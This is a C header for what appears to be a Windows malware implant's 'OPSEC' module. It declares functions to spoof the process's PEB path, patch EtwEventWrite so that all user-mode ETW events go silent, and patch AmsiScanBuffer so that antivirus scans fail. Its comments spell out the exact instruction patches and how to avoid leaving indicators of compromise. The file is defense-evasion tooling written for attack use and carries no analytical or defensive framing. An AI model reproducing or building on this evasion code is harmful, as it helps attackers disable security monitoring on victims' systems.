#pragma once

#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* =========================================================================
 *  Opsec.h - OPSEC module (process hiding, PEB spoofing, detection)
 * ========================================================================= */

void Opsec_SpoofPeb(const wchar_t* fakePath);

/* Patches EtwEventWrite in the process ntdll to  xor eax,eax / ret,
 * silencing all user-mode ETW events for the lifetime of the process.
 * Must be called after ApiHashing_InitHashes() and Syscalls_Init(). */
BOOL Opsec_PatchEtw(void);

/* Patches AmsiScanBuffer in amsi.dll to  mov eax,E_INVALIDARG / ret — but
 * ONLY when amsi.dll is already mapped in the process (Defender/AV present).
 * Never loads amsi.dll itself: an on-demand load would leave a fresh IOC in
 * the PEB LDR list.  Soft-fail — caller continues on FALSE. */
BOOL Opsec_PatchAmsi(void);

/* Populated by Opsec_PatchEtw: 1..4 identifies which step failed, 0 on success. */
extern DWORD g_EtwFailStep;

#ifdef __cplusplus
}
#endif
